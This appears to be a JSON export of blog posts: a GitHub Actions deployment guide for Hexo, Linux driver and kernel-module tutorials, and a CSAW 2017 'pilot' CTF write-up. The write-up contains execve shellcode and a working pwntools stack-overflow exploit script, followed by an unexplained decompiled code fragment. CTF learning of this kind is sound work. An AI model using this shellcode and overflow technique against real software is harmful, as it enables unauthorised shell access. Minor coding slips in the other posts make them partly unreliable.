{"posts":[{"title":"Automated deploying Hexo blogs by Github Actions","text":"Github Actions can easily implement CI/CD workflows to help us do some work, such as automated testing, packaging, deployment and other operations. When we run Jobs, it creates a container (runner) that supports Ubuntu, Windows, and MacOS. In the container we can install software, use the installed software to help us process some data, and then push the processed data somewhere. In this article, we’ll introduce the use of GitHub Actions to automate the deployment of Hexo to GitHub Pages. Generally, blogs that use Hexo use hexo generate --deploy to deploy, but this can take a long time if there are a lot of articles, or if the local node.js version is not compatible with Hexo. Using GitHub Actions helps you to avoid these situations. blog and xxx.github.io repositoryYou need two Git repositories, one for the blog source repository blog and one for the static page repository xxx.github.io The blog source repository, blog, can be private. The static page repository xxx.github.io, which must be public. deploy keysCreate a key using ssh-keygen (you can also use id_rsa if you want) In the blog source code repository page, add new secret via setting -&gt; Security -&gt; Secrets -&gt; Actions -&gt; New repository secret. The content is the private key. In the static page repository page, add new Deploy keys via setting -&gt; Security -&gt; Deploy keys. The content is the public key. And select “Allow Write Access”. Create GitHub ActionsCreate a .github/workflows/xxx.yml file in the root of the blog source repository 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354name: HEXO_DEPLOYon: [push]env: GIT_USER: ACce1er4t0r GIT_EMAIL: lkjlkj174@gmail.com THEME_REPO: ppoffice/hexo-theme-icarus THEME_BRANCH: master DEPLOY_REPO: ACce1er4t0r/ACce1er4t0r.github.io DEPLOY_BRANCH: mainjobs: build: runs-on: ubuntu-latest steps: - name: Checkout source uses: actions/checkout@v3 - name: Checkout theme repo uses: actions/checkout@v3 with: repository: ${{ env.THEME_REPO }} ref: ${{ env.THEME_BRANCH }} path: themes/icarus - name: Checkout deploy repo uses: actions/checkout@v3 with: repository: ${{ env.DEPLOY_REPO }} ref: ${{ env.DEPLOY_BRANCH }} path: .deploy_git - name: Use Node.js 14 uses: actions/setup-node@v2 with: version: 14 - name: Setup hexo env: ACTION_DEPLOY_KEY: ${{ secrets.HEXO_DEPLOY_SECRET }} run: | mkdir -p ~/.ssh/ echo &quot;$ACTION_DEPLOY_KEY&quot; &gt; ~/.ssh/id_rsa chmod 600 ~/.ssh/id_rsa ssh-keyscan github.com &gt;&gt; ~/.ssh/known_hosts git config --global user.email $GIT_USER git config --global user.name $GIT_EMAIL npm install npm install --save hexo-component-inferno@^2.0.2 - name: Hexo deploy run: | npm run deploy Meaning of the parameters name: the name of the Action on: Trigger condition, this task will be triggered when the condition is met, here on.push.branches.$.master means that the task will be executed when the master branch receives the push. env: Environment variable objects jobs: List of tasks under Action jobs.{job}.name: Task name jobs.{job}.runs-on: The required container for the task, optional values: ubuntu-latest, windows-latest, macos-latest. jobs.{job}.strategy: policy, can be written in array format, the job will iterate through this array. jobs.{job}.steps: A step where you can put what you want to do in steps. jobs.{job}.steps.$.name: The name of the step, which will be output as a LOG when compiled. jobs.{job}.steps.$.uses: The Action to be called, you can see more at https://github.com/actions. jobs.{jobs}.steps.$.with: An object that calls the Action, see the description of the Action used for details. Finally, just push the file to the master branch","link":"/2022/12/18/Automated-deploying-Hexo-blogs-with-Github-Actions/"},{"title":"PWN Learning: CSAW 2017 Quals - pilot","text":"CSAW 2017 Quals - pilot Write up A C++ PWN problem, the source code can be seen after decompiling by ida pro A stack overflow vulnerability can be quickly discovered by decompiling the code Debugging with gdb, pattern_create 100 after the input generated error messages It can be calculated that the offset is 40 bytes, after inputting 40 bytes of data can overwrite the subsequent 8 bytes of return address Use the following shellcode (execve([“/bin/sh”],[],[])) 1234567891011121314 0: 31 f6 xor esi, esi 2: 48 dec eax 3: bb 2f 62 69 6e mov ebx, 0x6e69622f 8: 2f das 9: 2f das a: 73 68 jae 0x74 c: 56 push esi d: 53 push ebx e: 54 push esp f: 5f pop edi10: 6a 3b push 0x3b12: 58 pop eax13: 31 d2 xor edx, edx15: 0f 05 syscall Get flag Here is the attack script: 1234567891011121314from pwn import *shellcode = b&quot;\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05# print(disasm(shellcode))#io = process(&quot;./easy_pwn&quot;)io = remote(&quot;xxx.xxx.xxx.xxx&quot;, xxxx)io.recvuntil(&quot;Location:&quot;)addr = int(io.recv()[0:14], 16)# print(address)io.sendline(shellcode+b'a'*(40-len(shellcode))+p64(addr))io.interactive() _JUNK_FUN_0((3 * dword_100910C0 * dword_100910C4 * dword_100910CC + 4096) | (dword_100910C4+ dword_100910D0+ 2 * (4096 - dword_100910C8)- dword_100910C0 * dword_100910CC+ 3 * dword_100910D4),(2 * (dword_100910D0 * (dword_100910D4 + dword_100910D0) + dword_100910C8 * (dword_100910C4 * dword_100910C8 * dword_100910C8 + 2) + 4 * (dword_100910C0 - dword_100910CC) + 4096 - dword_100910D4)) | (6 * (2 * dword_100910C4- dword_100910D4 * (dword_100910C8 * dword_100910CC + 1) - dword_100910CC) + dword_100910D0* (6* (dword_100910C0 * dword_100910C8 * dword_100910D0 - dword_100910C4 * dword_100910D4)- 6)+ 4096))","link":"/2022/03/17/PWN-Learning-CSAW-2017-Quals-pilot/"},{"title":"Programming Linux Character Driver","text":"Linux Character Driver Character Device StructuresCharacter device driver, block device driver and network device driver as the linux kernel three major driver devices, character devices mainly complete the byte read and write operations, common applications are mouse, keyboard, etc., the structure form is shown below: 12345678struct cdev { struct kobject kobj; struct module *owner; // Belonging modules struct file_operations *ops; // Character device operation method struct list_head list; dev_t dev; // Device unsigned int count;} The dev_t in the cdev structure represents the 32-bit device number, 12 bits are the major device number and 20 bits are the minor device number. The major device number and minor device number can be obtained from the dev_t by macro definitions MAJOR(dev_t dev) and MINOR(dev_t dev). In addition, dev_t can be generated from the primary and secondary device numbers using the macro definition MKDEV(int major, int minor). The Linux kernel provides a set of functions to operate on character device structures, which can be used to manipulate the cdev structure. 12345void cdev_init(struct cdev *, struct file_operations *); // Used to initialize the members of cdev and establish the connection between cdev and file_operationstruct cdev *cdev_alloc(void); // Used to dynamically request a cdev memoryvoid cdev_put(struct cdev *p);int cdev_add(struct cdev *, dev_t, unsigned); // Add a cdev to the system to complete the registration of the character device. The call to cdev_add() usually occurs in the character device driver module load functionvoid cdev_del(struct cdev *); // Deleting a cdev completes the cancellation of the character device. The call to the cdev_del() function usually occurs in the uninstall function of the character device driver module Call register_chrdev_region() or alloc_chrdev_region() function to request a device number from the system, and then call cdev_add() function to register the character device with the system. 12int register_chrdev_region(dev_t from, unsigned count, const char *name); // Known starting device numberint alloc_chrdev_region(dev_t *dev, unsigned baseminor, unsigned count,const char *name); // Unknown starting device number The member functions in the file_operations structure are eventually called by the kernel when the application makes Linux system calls such as open(), write(), read(), close(), etc. llseek() modifies the current read/write location of a file and returns the new location, returning a negative value in case of error. read() reads data from the device, returning the number of bytes read on success and a negative value on error. Corresponds to ssize_t read (int fd, voidbuf, size_t count) and size_t fread (voidptr, size_t size, size_t nmemb, FILE*stream) in user space applications. write() sends data to the device and returns the number of bytes written on success. If this function is not implemented, the user will get the -EINVAL return value when making the write() system call. Corresponds to ssize_t write (int fd, constvoidbuf, size_t count) and size_t fwrite (const voidptr, size_t size, size_t nmemb, FILE*stream) in user space applications. read() and write() indicate end-of-file (EOF) if they return 0. unlocked_ioctl() provides implementation of device-related control commands (neither read nor write operations) and returns a non-negative value to the calling program when called successfully. It is similar to the user-space application calls int fcntl (int fd, int cmd, … /arg/) and intioctl (int d, int request, …) counterparts. mmap() maps device memory into the virtual address space of the process. If the device driver does not implement this function, the user will get the -ENODEV return value when making the mmap() system call. This function is of particular interest for devices such as frame buffers, which are mapped into user space so that applications can access them directly without having to copy memory between the kernel and the application. It corresponds to the voidmmap (voidaddr, size_t length, int prot, int flags, int fd, off_t offset) function in user space applications. The functions for loading and unloading the character device driver module are as follows static int __init mydev_init(void) static void __exit mydev_exit(void) The application of device number and registration of cdev should be implemented in the load function of the character device driver module, while the release of device number and cancellation of cdev should be implemented in the unload function. Character Structures Programming Create a new dev folder and create mydev.c and the corresponding Makefile file in this directory The mydev.c program is as follows: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173#include &lt;linux/module.h&gt;#include &lt;linux/fs.h&gt;#include &lt;linux/init.h&gt;#include &lt;linux/cdev.h&gt;#include &lt;linux/slab.h&gt;#include &lt;linux/uaccess.h&gt;#define MYDEV_SIZE 0x1000#define MEM_CLEAR 0x1#define MYDEV_MAJOR 230static int mydev_major = MYDEV_MAJOR; //Define the major device numbermodule_param(mydev_major, int, S_IRUGO); // module parameter passingstruct mydev_dev { // Define the mydevmen_dev structure struct cdev cdev; // Character Structures unsigned char mem[MYDEV_SIZE]; // Memory};struct mydev_dev * mydev_devp;// Declare the mydev structure object// Read function of mydev device driverstatic ssize_t mydev_read(struct file * filp, char __user * buf, size_t size, loff_t * ppos) { unsigned long p = *ppos; unsigned int count = size; int ret = 0; struct mydev_dev * dev = filp-&gt;private_data; if (p &gt;= MYDEV_SIZE) { return 0; } if (count &gt; MYDEV_SIZE - p) { count = MYDEV_SIZE - p; } if (copy_to_user(buf, dev-&gt;mem + p, count)) { ret = -EFAULT; } else { *ppos += count; ret = count; printk(KERN_INFO &quot;read %u bytes(s) from %lu\\n&quot;, count, p); } return ret;}// Write function for mydev device driverstatic ssize_t mydev_write(struct file * filp, const char __user * buf, size_t size, loff_t * ppos) { unsigned long p = *ppos; unsigned int count = size; int ret = 0; struct mydev_dev * dev = filp-&gt;private_data; if (p &gt;= MYDEV_SIZE) { return 0; } if (count &gt; MYDEV_SIZE - p) { count = MYDEV_SIZE - p; } if (copy_from_user(dev-&gt;mem + p, buf, count)) { ret = -EFAULT; } else { *ppos += count; ret = count; printk(KERN_INFO &quot;written %u bytes(s) from %lu\\n&quot;, count, p); } return ret;}// Addressing functionsstatic loff_t mydev_llseek(struct file * filp, loff_t offset, int flag) { loff_t ret = 0; switch (flag) { case 0: /* Seek from the beginning of the file */ if (offset&lt; 0 || (unsigned int)offset &gt; MYDEV_SIZE) { ret = -EINVAL; break; } filp-&gt;f_pos = (unsigned int)offset; ret = filp-&gt;f_pos; break; case 1: /* Seek from the current location of the file */ if ((filp-&gt;f_pos + offset) &gt; MYDEV_SIZE || (filp-&gt;f_pos + offset) &lt; 0) { ret = -EINVAL; break; } filp-&gt;f_pos += offset; ret = filp-&gt;f_pos; break; default: ret = -EINVAL; break; } return ret;}static long mydev_ioctl(struct file * filp, unsigned int cmd, unsigned long arg) { struct mydev_dev * dev = filp-&gt;private_data; switch (cmd) { case MEM_CLEAR: memset(dev-&gt;mem, 0, MYDEV_SIZE); printk(KERN_INFO &quot;mydev is set to zero\\n&quot;); break; default: return -EINVAL; } return 0;}// open functionstatic int mydev_open(struct inode * inode, struct file *filp) { filp-&gt;private_data = mydev_devp; return 0;}// release functionstatic int mydev_release(struct inode * inode, struct file * filp) { return 0;}// Define the character structure methodstatic const struct file_operations mydev_fops = { .owner = THIS_MODULE, .llseek = mydev_llseek, .read = mydev_read, .write = mydev_write, .unlocked_ioctl = mydev_ioctl, .open = mydev_open, .release = mydev_release,};// Character device setup functionsstatic void mydev_setup_cdev(struct mydev_dev * dev, int index) { int err, devno = MKDEV(mydev_major, index); // Get the device structure dev_t cdev_init(&amp;dev-&gt;cdev, &amp;mydev_fops); // Initialization of character devices and character device handling methods dev-&gt;cdev.owner = THIS_MODULE; // Initialize the module to which the character device belongs err = cdev_add(&amp;dev-&gt;cdev, devno, 1); // Add a character device if (err) { printk(KERN_NOTICE &quot;Error %d adding mydev%d&quot;, err, index); }}// Module initializationstatic int __init mydev_init(void) { int ret; dev_t devno = MKDEV(mydev_major, 0); // Get the character device structure if (mydev_major) { ret = register_chrdev_region(devno, 1, &quot;mydev&quot;); // Register this cdev device, the second parameter is the number } else { ret = alloc_chrdev_region(&amp;devno, 0, 1, &quot;mydev&quot;); // Request character device cdev space, the second parameter is the base, the third is the number mydev_major = MAJOR(devno); // Get the major device number } if (ret &lt; 0) { return ret; } mydev_devp = kzalloc(sizeof(struct mydev_dev), GFP_KERNEL); // Allocate mydev structure internal memory if (!mydev_devp) { ret = -ENOMEM; goto fail_malloc; //Jump if assignment fails } // The differenct between major and minor equipment mydev_setup_cdev(mydev_devp, 0); return 0; fail_malloc: unregister_chrdev_region(devno, 1); return ret;}module_init(mydev_init);// Module uninstall functionstatic void __exit mydev_exit(void) { cdev_del(&amp;mydev_devp-&gt;cdev); kfree(mydev_devp); unregister_chrdev_region(MKDEV(mydev_major, 0), 1);}module_exit(mydev_exit);MODULE_AUTHOR(&quot;AC&quot;);MODULE_LICENSE(&quot;GPL v2&quot;); The Makefile program is as follows: 12345678mydev.oKDIR := /home/test/test_kernel/linux-5.3.2PWD :=$(shell pwd)default: make -C $(KDIR) M=$(PWD) modulesclean: make -C $(KDIR) M=$(PWD) clean Character device validation Enter the make command in the mydev directory First dmesg -c Then insert the module as administrator and type insmod mydev.ko in the mydev directory cat /proc/devices Enter characters into this character device to create a device node: mknod /dev/mydev c 230 0 //230 0 is the primary and secondary device number of the device you created; write the string: echo “hello world!”&gt;/dev/mydev; check the input information: cat /dev/mydev; check the read/write situation: dmesg mydev Test CodeCreate the mydevTest.c test file with the following code: 12345678910111213141516171819202122#include &lt;fcntl.h&gt;#include &lt;stdio.h&gt;int main(void) { char s[] = &quot;OvO\\nTest,TeSt,Te5t,tesTte5T,tesT\\n&quot;; char buffer[80]; int fd=open(&quot;/dev/mydev&quot;, O_RDWR); // Open mydev device, fd returns a number greater than 2 then success, O_RDWR for permission to give if (fd &gt;= 0) { write(fd, s, sizeof(s)); printf(&quot;---Write something to mydev---\\n%d\\n%s\\n&quot;, fd, s); close(fd); } else { printf(&quot;fd = %d, seems there are some error...\\n&quot;, fd); } if (fd = open(&quot;/dev/mydev&quot;, O_RDWR) &gt;= 0) { read(fd, buffer, sizeof(buffer)); printf(&quot;---Read something from mydev---\\n%d\\n%s\\n&quot;, fd, buffer); } else { printf(&quot;fd = %d, seems there are some error...\\n&quot;, fd); } return 0;} Type gcc mydevTest.c a.out to generate a.out, then type . /a.out to run. mydev: loading out-of-tree module taints kernel.mydev: module verification failed: signature and/or required key missing - tainting kernel are the very beginning of the Linux source code .config, which will be shown in this experiment but does not affect If there is no CONFIG_MODULE_SIG=n statement in the Makefile file, then the hello.txt file will show module verification failed: signature and/or required key missing - tainting kerneli.e.: Module verification failed.","link":"/2022/03/17/Programming-Linux-Character-Driver/"},{"title":"Programming Linux Modules","text":"Kernel Module Implemented modules12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849//select_and_show.c#include &lt;linux/kernel.h&gt;#include &lt;linux/sched.h&gt;#include &lt;linux/module.h&gt;#include &lt;linux/init.h&gt;#include &lt;linux/moduleparam.h&gt;#include &lt;linux/sched/signal.h&gt;static unsigned int pid;module_param(pid, uint, 0644);static int select_and_show_init(void) { struct task_struct * p; struct task_struct * parent; struct task_struct * children; struct task_struct * sibling; struct list_head * list; printk(&quot;Begin\\n&quot;); printk(&quot;Relationship\\tName \\tPID \\tStat \\tPrio \\n&quot;); p = pid_task(find_vpid(pid), PIDTYPE_PID); printk(&quot;Self \\t%-20s\\t%-6d\\t%-6ld\\t%-6d\\n&quot;, p-&gt;comm, p-&gt;pid, p-&gt;state, p-&gt;prio); parent = p-&gt;parent; printk(&quot;Parent \\t%-20s\\t%-6d\\t%-6ld\\t%-6d\\n&quot;, parent-&gt;comm, parent-&gt;pid, parent-&gt;state, parent-&gt;prio); list = &amp;parent-&gt;children; list_for_each(list, &amp;parent-&gt;children) { sibling = list_entry(list, struct task_struct, sibling); printk(&quot;Brother \\t%-20s\\t%-6d\\t%-6ld\\t%-6d\\n&quot;, sibling-&gt;comm, sibling-&gt;pid, sibling-&gt;state, sibling-&gt;prio); } list = &amp;p-&gt;children; list_for_each(list, &amp;p-&gt;children) { children = list_entry(list, struct task_struct, sibling); printk(&quot;Children \\t%-20s\\t%-6d\\t%-6ld\\t%-6d\\n&quot;, children-&gt;comm, children-&gt;pid, children-&gt;state, children-&gt;prio); } return 0;}static void select_and_show_exit(void) { printk(KERN_ALERT&quot;goodbye~\\n&quot;);}module_init(select_and_show_init);module_exit(select_and_show_exit);MODULE_LICENSE(&quot;GPL&quot;); 12345678910111213141516171819202122232425//show_all.c#include &lt;linux/init.h&gt; #include &lt;linux/module.h&gt;#include &lt;linux/kernel.h&gt;#include &lt;linux/sched.h&gt;#include &lt;linux/init_task.h&gt;static int show_all_init(void) { struct task_struct *p; p = &amp;init_task; printk(KERN_ALERT&quot;Name \\tPid\\tStat\\tPrio\\tParent\\t&quot;); for_each_process(p) { printk(KERN_ALERT&quot;%-20s\\t%d\\t%ld\\t%d\\t%d\\n&quot;, p-&gt;comm, p-&gt;pid, p-&gt;state, p-&gt;prio, p-&gt;parent-&gt;pid); } return 0;}static void show_all_exit(void) { printk(KERN_ALERT&quot;goodbye~\\n&quot;); //KERN_ALERT}module_init(show_all_init);module_exit(show_all_exit);MODULE_LICENSE(&quot;GPL&quot;); 12345678obj-m := show_all.oshow_all-objs:=lab2_1.oKDIR := /home/test/test_kernel/linux-5.3.2PWD :=$(shell pwd)default: make -C $(KDIR) M=$(PWD) modulesclean: make -C $(KDIR) M=$(PWD) clean Related Source CodeLicense statement for modulesMODULE_LICENSE(&quot;GPL&quot;); 1234567MODULE_LICENSE(_license) // _license is the license name string//&quot;GPL&quot; [GNU Public License v2 or later]//&quot;GPL v2&quot; [GNU Public License v2]//&quot;GPL and additional rights&quot; [GNU Public License v2 rights and more]//&quot;Dual BSD/GPL&quot; [GNU Public License v2 or BSD license choice]//&quot;Dual MIT/GPL&quot; [GNU Public License v2 or MIT license choice]//&quot;Dual MPL/GPL&quot; [GNU Public License v2 or Mozilla license choice] From kernel version 2.4.10 on, modules must declare the license of this module via the MODULE_LICENSE macro, otherwise you will receive a warning that the kernel is contaminated with “kernel tainted” when loading this module. As we can see from the linux/module.h file, the meaningful licenses accepted by the kernel are “GPL”, “GPL v2”, “GPL and additional rights”, “Dual BSD/GPL”, “Dual MPL/GPL”, “Proprietary “. module_init (TODO)Find the include\\linux\\init.h file in the kernel source code directory 1#define module_init(x) __initcall(x); If this is a macro definition, then what is __initcall(x)? 123#define __define_initcall(fn, id) \\ static initcall_t __initcall_##fn##id __used \\ __attribute__((__section__(&quot;.initcall&quot; #id &quot;.init&quot;))) = fn initcalls 12345678910111213141516171819#define pure_initcall(fn) __define_initcall(fn, 0) #define core_initcall(fn) __define_initcall(fn, 1) #define core_initcall_sync(fn) __define_initcall(fn, 1s) #define postcore_initcall(fn) __define_initcall(fn, 2) #define postcore_initcall_sync(fn) __define_initcall(fn, 2s) #define arch_initcall(fn) __define_initcall(fn, 3) #define arch_initcall_sync(fn) __define_initcall(fn, 3s) #define subsys_initcall(fn) __define_initcall(fn, 4) #define subsys_initcall_sync(fn) __define_initcall(fn, 4s) #define fs_initcall(fn) __define_initcall(fn, 5) #define fs_initcall_sync(fn) __define_initcall(fn, 5s) #define rootfs_initcall(fn) __define_initcall(fn, rootfs) #define device_initcall(fn) __define_initcall(fn, 6) #define device_initcall_sync(fn) __define_initcall(fn, 6s) #define late_initcall(fn) __define_initcall(fn, 7) #define late_initcall_sync(fn) __define_initcall(fn, 7s) #define __initcall(fn) device_initcall(fn) We can see very many xxx_initcall macro function definitions, they are all implemented by __define_initcall. Inside __define_initcall there are two parameters, one is fn and the other is id. The function do_initcalls can be found in the init\\main.c file 1234567static void __init do_initcalls(void) { int level; for (level = 0; level &lt; ARRAY_SIZE(initcall_levels) - 1; level++) do_initcall_level(level); } do_initcalls seems to be mainly a for loop, which is executing some functions by level. So the question arises, what is level and what function is executed, but this goes back to the above macro definition, first a simple wave of macro definition process module_init(fn)---&gt; __initcall(fn) ---&gt; device_initcall(fn) ---&gt; __define_initcall(fn, 6) 123#define __define_initcall(fn, id) \\ static initcall_t __initcall_##fn##id __used \\ __attribute__((__section__(&quot;.initcall&quot; #id &quot;.init&quot;))) = fn In the macro definition above, ## can mean a connection, and __initcall_##fn##id is __initcall_fnid When fn is helloworld and id is 4, __initcall_##fn##id is __initcall_helloworld4 A single # symbol can be stringified, and #id for &quot;id&quot; TODO… Parameters of printk1234567891011121314151617181920212223// Emergency event message, prompted before a system crash, indicating that the system is unavailable#define KERN_EMERG 0// Report message that immediate action must be taken#define KERN_ALERT 1// Critical conditions, usually involving severe hardware or software operational failures#define KERN_CRIT 2// Error conditions, drivers often use KERN_ERR to report hardware errors#define KERN_ERR 3// Warning conditions for possible problem situations#define KERN_WARNING 4// Normal but important conditions for reminding#define KERN_NOTICE 5// Prompt messages, such as printing hardware information when the driver starts#define KERN_INFO 6// Debug level messages#define KERN_DEBUG 7 task_structStatus of the process1volatile long state; /* -1为不可运行，0可以运行，大于0表示停止 */ ​The process in Linux consists of multiple states, and during operation, the process will switch in multiple situations with scheduling, and the information of the process is the basis for the process to make scheduling swaps State Meaning TASK_RUNNING Runnable TASK_INTERRUPTIBLE Waiting TASK_UNINTERRUPTIBLE Uninterruptible waiting TASK_ZOMBIE Zombie TASK_STOPPED Pause TASK_SWAPPING Switching in/out Flags of the process1unsigned int flags; /* per process flags, defined below */ ​Used by the kernel to identify the state of the current process for the next operation Flag Meaning PF_FORKNOEXEC The process has just been created and has not yet been executed PF_SUPERPRIV Super User Privileges PF_DUMPCORE Catching of exceptions PF_SIGNALED Process killed by signal PF_EXIRING The process begins to close Identifier of the process12pid_t pid; //Identifier of the processpid_t tgid; //Group number of the thread Relatives between processes12345678struct task_struct *real_parent; /* real parent process */ struct task_struct *parent; /* recipient of SIGCHLD, wait4() reports */ /* * children/sibling forms the list of my natural children */ struct list_head children; /* list of my children */ struct list_head sibling; /* linkage in my parent's children list */ struct task_struct *group_leader; /* threadgroup leader */ ​ Processes are created with an inheritance relationship; a process can create multiple child processes, which are the parents of these child processes, and these child processes have a sibling relationship with each other. ​ When creating a child process, the child process inherits most of the information from the parent process, which means that the child process copies most of the information from the task_struct structure of the parent process, except for the pid, and thus the system needs to record these relatives in order to collaborate between processes. ​ The task_struct structure of each process contains a number of pointers that connect the task _struct structures of all the processes to form a process tree. Relatives Meaning real_parent real parent parent parent process children The head of the chain table, all elements of the chain table are its child processes sibling Insert the current process into the sibling chain group_leader Points to the first entry in its process group｜ ptrace system call1unsigned int ptrace; ​ The ptrace system call provides the ability for the parent process to observe and control the execution of the child process, and allows the parent process to check and replace the values of the child process’ kernel image (including registers). ​ Basic principle: When ptrace tracing is used, all signals sent to the traced child process are forwarded to the parent process, which is blocked. And after the parent process receives the signal, it can check and modify the stopped child process, and then let the child process continue to run. Please our common debugging tool gdb is based on ptrace to implement it. Scheduling information of the process123const struct sched_class *sched_class;struct sched_entity se;struct sched_rt_entity rt; sched_class: Scheduling Class se: Calling entities for common processes, each process has one of these entities rt: Real-time process call entities, each process has one of these entities ​Process scheduling uses this information to determine a limited order of process execution, combined with process state information to ensure that processes run in a reasonable and orderly manner. Processes have various scheduling information, as follows. Name Meaning Usage SCHED_OTHER Other scheduling methods Normal process SCHED_FIFO First in first out Real-time processes SCHED_RR Round-Robin Real-time processes Priority of the process12int prio, static_prio, normal_prio;unsigned int rt_priority; Name Priority prio Dynamic Priority static_prio Static Priority normal_prio Normal Priority rt_prio Real-time Priority The value of prio is the final priority value used by the scheduler, i.e., the value actually chosen by the scheduler when selecting a process. The prio smaller, the process’s priority higher. prio values range from 0 to MAX_PRIO, i.e., 0 to 139 (including 0 and 139), and can be divided into two intervals depending on the scheduling strategy, where the interval 0 to 99 is for real-time processes and non-real-time processes in the range of 100~139. static_prio static priority will not change over time, the kernel will not actively modify it, but only through the system call nice to modify static_prio, and the static priority calculation formula is static_prio = MAX_RT_PRIO + nice +20. The value of MAX_RT_PRIO is 100, and the range of nice range is -20 to +19, so the static_prio value ranges from 100 to 139. The smaller the value of static_prio, the higher the static priority of the process. The value of normal_prio depends on the static priority and scheduling policy and can be set by the _setscheduler function. For non-real-time processes, the value of normal_prio is equal to the static priority value static_prio; for real-time processes, normal_prio = MAX_RT_PRIO-1 - p-&gt;rt_priority. The rt_priority value ranges from 0 ~ 99 and is only valid for real-time processes. From the equation: prio = MAX_RT_PRIO-1 - p-&gt;rt_priority; it can be seen that the larger the value of rt_priority, the smaller the value of prio, so the larger the value of real time priority (rt_priority) means the higher the priority of the process. Time data information1234567891011cputime_t utime, stime, utimescaled, stimescaled; cputime_t gtime; cputime_t prev_utime, prev_stime; unsigned long nvcsw, nivcsw; /* context switch counts */ struct timespec start_time; /* monotonic time */ struct timespec real_start_time; /* boot based time *//* mm fault and swap info: this can arguably be seen as either mm-specific or thread-specific */ unsigned long min_flt, maj_flt; struct task_cputime cputime_expires; struct list_head cpu_timers[3]; Name Meaning utime/stime Record the timers passed by the process in user/kernel state utimescaled/stimescaled Record the runtime of the process in user/kernel state gtime Virtual machine time counted in beats prev_utime/prev_stime Previous running time nvcsw/nivcsw Voluntary/Involuntary Context Switching Count start_time/real_start_time Process creation time / the latter includes sleep time｜ cputime_expires Count the processor time of a process or process group being tracked｜ ｜min_flt, maj_flt Missing page statistics｜ Communication between processes1234#ifdef CONFIG_SYSVIPC/* ipc stuff */ struct sysv_sem sysvsem;#endif ​If multiple processes are performing collaboration on a task, then it is necessary that these incoming processes can access each other’s resources and communicate with each other.The main process communication methods in Linux are: pipes semaphores shared memory signals message queues File Information123456/* file system info */ int link_count, total_link_count; /* filesystem information */ struct fs_struct *fs; /* open file information */ struct files_struct *files; define Meaning struct fs_struct *fs Processes can be executed on the system where they affect struct files_struct *files Files opened by the process Processes can open or close files, which are system resources, and the Linux kernel has to keep a record of how the process uses the files. There are two data structures in the task_struct structure to describe the information related to the process pre-file. The fs _struct describes two VFS index nodes, called root and pwd, which point to the root and current or working directories corresponding to the process’s executable impact, respectively. The file _struct structure is used to record the descriptors of the files opened by the process. Signal processing information1234567891011struct signal_struct *signal;struct sighand_struct *sighand;sigset_t blocked, real_blocked;sigset_t saved_sigmask; /* restored if set_restore_sigmask() was used */struct sigpending pending;unsigned long sas_ss_sp;size_t sas_ss_size;int (*notifier)(void *priv);void *notifier_data;sigset_t *notifier_mask; name Meaning signal Signal descriptor pointing to the process sighand Signal handler descriptor pointing to the process blocked Indicates the mask of the blocked signal, real_blocked indicates a temporary mask pending Data structure for storing private pending signals saa_ss_sp Alternate stack address for signal handlers, ass_ss_size indicates the stack size notifier_data/notifier_mask The device driver uses the function pointed to by the notifier to block certain semaphores of the process. notifier_data is the data that may be used by the function pointed to by the notifier 虚拟内存处理1struct mm_struct *mm, *active_mm; define Meaning struct mm_struct *mm Describe the address space of the process struct mm_struct *activa_mm Address space borrowed by kernel threads mm_struct is used to describe the address space (virtual space) of each process. active_mm is introduced for kernel threads, because kernel threads do not have their own address space. In order to make kernel threads have a uniform context switch with ordinary processes, when a kernel thread makes a context switch, let the active_mm of the switched-in thread point to the active_mm of the process that has just been dispatched out. Page management informationWhen there is not enough physical memory, the Linux memory management system needs to transfer some pages from memory to external memory, and the swap is done on a page-by-page basis. define Meaning int swappable Whether the memory pages occupied by the process can be swapped out unsigned long min_flat, maj_flt, nswap The accumulated number of missing pages, the master count and the accumulated number of pages swapped out and in of the process unsigned long cmin_flat, cnswap Cumulative number of sub-page misses, pages swapped in, for this process as an ancestor process, for all its hierarchical child processes｜ Process Queue Pointer struct task_struct *next_task, *prev_task; // All processes (in the form of PCBs) form a two-way chain. next_task and prev_task are the front and back pointers to the chain. The head and tail of the chain are init_task (i.e. process 0). struct task_struct *next_run, *prev_run; // The run_queue is a two-way circular chain of processes that are running or can be run with the process status TASK_RUNNING. The front and back pointers of the chain are next_run and prev_run, and the head and tail of the chain are both init_task (i.e. process 0). struct task_struct *p_opptr, *p_pptr;和struct task_struct *p_cptr, *p_ysptr, *p_osptr; // The above are pointers to the original parent, parent, youngest child, and newer and older sibling processes respectively. TODO… init_taskinit_task is the first process of the kernel, process number 0, which becomes idle process when the initialization of the kernel is completed init_task is a task_struct prototype for all processes and threads in the kernel. During kernel initialization, a task_struct interface is constructed by static definition, named init_task, and then a new kernel init thread, kthreadd kernel thread, is created by the rest_init() function later in the kernel initialization The kernel init thread, which eventually executes the /sbin/init process, becomes the root process of all user state programs (as shown by the pstree command), i.e. the user space init process The first init is a kernel thread created by kthread_thread, which, after initialization, moves to user space and generates the ancestors of all user processes kernel kthreadd kernel thread, becomes the parent of all other daemon threads in the kernel state. Its task is to manage and schedule other kernel threads kernel_thread, which loops through a kthread function that runs the kthreads maintained in the kthread_create_list global chain, and the kernel threads created when we call kernel_thread are added to this chain, so all kernel threads are directly or indirectly parented to kthreadd The kernel will use the init_task as its task_struct structure descriptor, and when the system has nothing else to do, it will schedule its execution. At this point, the kernel will become an idle process, giving up the CPU and putting itself to sleep in a continuous loop. Initialization of the stackThe process init_task is defined in init/init_task.c 123/* Initial task structure */ struct task_struct init_task = INIT_TASK(init_task); EXPORT_SYMBOL(init_task); The macro for INIT_TASK is defined in include/linux/init_task.h 1234567891011121314151617#define INIT_TASK(tsk) \\ { \\ .state = 0, \\ .stack = &amp;init_thread_info, \\ .usage = ATOMIC_INIT(2), \\ .flags = PF_KTHREAD, \\ .prio = MAX_PRIO-20, \\ .static_prio = MAX_PRIO-20, \\ .normal_prio = MAX_PRIO-20, \\ .policy = SCHED_NORMAL, \\ .cpus_allowed = CPU_MASK_ALL, \\ .nr_cpus_allowed= NR_CPUS, \\ .mm = NULL, \\ .active_mm = &amp;init_mm, \\ .restart_block = { \\ ....... } We can see that the stack of the 